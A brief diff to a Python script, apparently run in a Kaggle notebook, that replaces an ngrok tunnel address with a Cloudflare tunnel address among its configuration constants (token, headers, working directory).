@@ -3,7 +3,7 @@
 import os, glob, json, time, base64, shutil, subprocess, sys, urllib.request
 
 TOK = "GOLD24"
-DOOR = "https://retrain-schnapps-upbeat.ngrok-free.dev"
+DOOR = "https://fathers-crowd-fraction-vatican.trycloudflare.com"
 HDRS = {"User-Agent": "kilo-infer", "ngrok-skip-browser-warning": "1"}
 WORK = "/kaggle/working"
 
